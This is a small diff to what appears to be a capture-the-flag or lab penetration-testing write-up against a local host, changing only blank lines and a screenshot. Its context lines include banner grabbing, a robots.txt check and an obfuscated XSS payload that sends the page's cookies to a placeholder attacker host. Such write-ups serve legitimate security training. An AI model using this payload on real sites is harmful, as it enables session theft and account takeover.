@@ -15,6 +15,7 @@ Perform banner-grabbing against the target server to inspect the HTTP header inf
 ```bash id="5nj7bw"
 curl -I http://192.168.1.8:3075/
 ```
+
 <img width="711" height="177" alt="image" src="https://github.com/user-attachments/assets/abf4ab9a-8cb5-476b-8d84-64476a0faa1f" />
 
 ### Finding
@@ -60,6 +61,7 @@ Access:
 ```text id="iq5f6z"
 http://192.168.1.8:3075/robots.txt
 ```
+
 <img width="843" height="220" alt="image" src="https://github.com/user-attachments/assets/a98a70d1-5bc3-435a-8713-89a1f98cc51a" />
 
 The file disallows crawling sensitive endpoints.
@@ -206,7 +208,7 @@ The attacker launches a Python HTTP Server on their laptop (port 8000) as a list
 <svg onload="fetch('http://<ATTACKER_IP>:8000/?c='+window['docu'+'ment']['coo'+'kie'])">
 ```
 
-<img width="1055" height="539" alt="image" src="https://github.com/user-attachments/assets/a7624d33-4321-47e6-b923-203bb261dfb8" />
+<img width="1055" height="354" alt="image" src="https://github.com/user-attachments/assets/7eb0d267-c459-407a-ba10-5976a8c52589" />
 
 🎯 Transfer Mechanism Flag:
 
